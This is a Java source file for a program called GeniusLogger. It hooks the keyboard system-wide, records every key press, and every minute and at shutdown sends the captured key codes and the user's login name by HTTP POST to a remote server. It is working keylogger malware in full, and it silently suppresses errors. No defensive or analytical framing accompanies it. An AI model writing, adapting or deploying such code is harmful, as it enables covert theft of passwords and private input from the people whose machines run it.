package fr.yggdrasil80.geniuslogger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public final class GeniusLogger implements NativeKeyListener {

    private URL url;
    private int last;
    private final int delay;
    private final StringBuilder builder;

    public GeniusLogger() {
        this.builder = new StringBuilder();
        this.delay = System.getenv("GENIUS_SEND_DELAY") != null ? Integer.parseInt(System.getenv("GENIUS_SEND_DELAY")) : 60;
    }

    public void start() {
        try {
            this.url = new URL(System.getenv("GENIUS_SEND_URL") != null ? System.getenv("GENIUS_SEND_URL") : "http://redis.yggdrasil80.tech:1711/log");
            this.last = 0;
        } catch (MalformedURLException ignored) {}

        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(this);
        } catch (NativeHookException e) {
            System.exit(-1);
        }

        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(this::send, this.delay, this.delay, TimeUnit.SECONDS);
        Runtime.getRuntime().addShutdownHook(new Thread(this::send));
    }

    public void send() {
        try {
            if (this.builder.length() == 0) return;

            final HttpURLConnection conn = (HttpURLConnection) this.url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length", Integer.toString(this.builder.length()));
            conn.setRequestProperty("Genius-Name", System.getProperty("user.name"));
            conn.setUseCaches(false);

            try (final DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
                dos.writeBytes(this.builder.deleteCharAt(this.builder.length() - 1).toString());
            }

            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                while (br.readLine() != null) continue;
            }

            this.builder.setLength(0);
        } catch (Exception ignored) {}
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        if ((e.isActionKey() || e.getKeyCode() == 14) && this.last == e.getKeyCode()) return;
        this.builder.append(e.getKeyCode()).append(",");
        this.last = e.getKeyCode();
    }
}
